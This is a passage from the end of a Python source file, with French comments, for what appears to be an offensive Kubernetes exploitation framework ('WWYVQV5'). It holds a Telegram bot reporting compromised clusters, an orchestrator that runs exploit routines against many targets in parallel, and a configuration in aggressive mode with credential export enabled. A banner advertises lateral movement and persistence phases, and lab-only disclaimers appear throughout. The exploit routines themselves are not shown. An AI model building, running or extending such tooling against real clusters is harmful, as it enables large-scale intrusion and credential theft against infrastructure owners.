**Niveaux de menace:**
        """
        
        threat_counts = {}
        for cluster in self.framework.compromised_clusters.values():
            level = cluster.threat_level.value
            threat_counts[level] = threat_counts.get(level, 0) + 1
        
        for level, count in threat_counts.items():
            emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}.get(level, "⚪")
            stats_text += f"\n{emoji} {level.upper()}: {count}"
        
        self.bot.reply_to(message, stats_text, parse_mode='Markdown')
    
    def run(self):
        """Démarrage du bot"""
        if self.bot:
            self.bot.polling(none_stop=True)
        else:
            print("❌ Telegram bot non disponible")


# ═══════════════════════════════════════════════════════════════════════════════
# 🎯 ORCHESTRATEUR PRINCIPAL - TOUTES LES PHASES
# ═══════════════════════════════════════════════════════════════════════════════

class WWYVQv5KubernetesOrchestrator:
    """Orchestrateur principal pour toutes les phases d'exploitation"""
    
    def __init__(self):
        self.exploitation_framework = None
        self.web_dashboard = None
        self.telegram_bot = None
        self.session_id = str(uuid.uuid4())[:8]
    
    async def initialize(self, config: ExploitationConfig):
        """Initialisation de tous les composants"""
        print("🚀 WWYVQV5 - Initialisation du framework complet...")
        
        # Framework d'exploitation principal
        self.exploitation_framework = KubernetesAdvancedExploitation(config)
        
        # Interface web (Phase 3)
        if HAS_INTEGRATIONS:
            self.web_dashboard = KubernetesExploitationDashboard(self.exploitation_framework)
        
        # Bot Telegram (Phase 3) - nécessite un token
        # self.telegram_bot = KubernetesTelegramBot("TOKEN", self.exploitation_framework)
        
        print("✅ Tous les composants initialisés")
    
    async def run_full_exploitation(self, targets: List[str]):
        """Exécution complète de toutes les phases d'exploitation"""
        
        # Validation de l'environnement
        if not await self.exploitation_framework.validate_environment(targets):
            print("🚨 ARRÊT: Validation d'environnement échouée")
            return
        
        print(f"🎯 Début d'exploitation sur {len(targets)} cibles")
        
        # Phase 1-4: Exploitation parallèle
        async with aiohttp.ClientSession() as session:
            tasks = []
            for target in targets:
                base_url = f"https://{target}" if not target.startswith('http') else target
                task = self.exploitation_framework.exploit_cluster(session, target, base_url)
                tasks.append(task)
            
            # Exécution en parallèle avec limite de concurrence
            semaphore = asyncio.Semaphore(self.exploitation_framework.config.max_concurrent_clusters)
            
            async def limited_exploit(task):
                async with semaphore:
                    return await task
            
            results = await asyncio.gather(*[limited_exploit(task) for task in tasks], 
                                         return_exceptions=True)
        
        # Génération des rapports
        await self.exploitation_framework.generate_comprehensive_report()
        
        # Affichage du résumé final
        self.exploitation_framework.print_final_summary()
        
        # Nettoyage si configuré
        if self.exploitation_framework.config.cleanup_on_exit:
            await self.exploitation_framework.cleanup_all_artifacts()
    
    def start_web_dashboard(self, host='127.0.0.1', port=5000):
        """Démarrage de l'interface web"""
        if self.web_dashboard:
            print(f"🌐 Dashboard web démarré: http://{host}:{port}")
            self.web_dashboard.run(host=host, port=port, debug=False)
        else:
            print("❌ Dashboard web non disponible")
    
    def start_telegram_bot(self):
        """Démarrage du bot Telegram"""
        if self.telegram_bot:
            print("🤖 Bot Telegram démarré")
            self.telegram_bot.run()
        else:
            print("❌ Bot Telegram non configuré")


# ═══════════════════════════════════════════════════════════════════════════════
# 🚀 POINT D'ENTRÉE PRINCIPAL
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    """Point d'entrée principal pour démonstration"""
    
    # Configuration d'exploitation
    config = ExploitationConfig(
        mode=ExploitationMode.AGGRESSIVE,  # Mode agressif pour démo
        max_pods_per_cluster=3,
        max_concurrent_clusters=5,
        timeout_per_operation=15,
        cleanup_on_exit=True,
        maintain_access=False,  # Sécurité: pas de persistance en démo
        export_credentials=True,
        telegram_alerts=False,
        discord_alerts=False,
        validate_lab_env=True  # Sécurité: validation obligatoire
    )
    
    # Orchestrateur principal
    orchestrator = WWYVQv5KubernetesOrchestrator()
    await orchestrator.initialize(config)
    
    # Targets d'exemple (LAB UNIQUEMENT)
    demo_targets = [
        "127.0.0.1:6443",      # minikube local
        "127.0.0.1:8443",      # kind local
        "localhost:10250",     # kubelet local
    ]
    
    print("⚠️  DÉMONSTRATION SUR ENVIRONNEMENT LAB UNIQUEMENT")
    print("🎯 Targets de démonstration:", demo_targets)
    
    # Exécution de l'exploitation complète
    await orchestrator.run_full_exploitation(demo_targets)
    
    print("\n🎉 EXPLOITATION TERMINÉE!")
    print("📁 Consultez les rapports générés dans le dossier de sortie")


if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════════════════╗
    ║                                                                      ║
    ║              🚀 WWYVQV5 - KUBERNETES EXPLOITATION v5.0              ║
    ║                                                                      ║
    ║           Framework Complet d'Exploitation Kubernetes                ║
    ║                    Toutes les Phases Implémentées                    ║
    ║                                                                      ║
    ║  🎯 PHASES INCLUSES:                                                 ║
    ║     • Phase 1: Fondations d'exploitation                            ║
    ║     • Phase 2: Lateral Movement & Persistence                       ║
    ║     • Phase 3: Interface & Contrôle                                 ║
    ║     • Phase 4: Optimisation & Intégration                           ║
    ║                                                                      ║
    ║  ⚠️  UTILISATION RESPONSABLE UNIQUEMENT                              ║
    ║     Tests de sécurité autorisés • Environnements lab               ║
    ║                                                                      ║
    ║  👨‍💻 Développé par: wKayaa                                           ║
    ║  📅 Date: 2025-06-23 20:39:48 UTC                                   ║
    ║                                                                      ║
    ╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    # Vérification de sécurité
    confirm = input("\n🔒 Confirmez que vous utilisez ce framework dans un environnement de test autorisé [oui/NON]: ")
    if confirm.lower() != 'oui':
        print("🚫 Utilisation annulée par l'utilisateur")
        sys.exit(0)
    
    # Lancement
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹️  Exploitation interrompue par l'utilisateur")
    except Exception as e:
        print(f"\n❌ Erreur critique: {str(e)}")
        sys.exit(1) 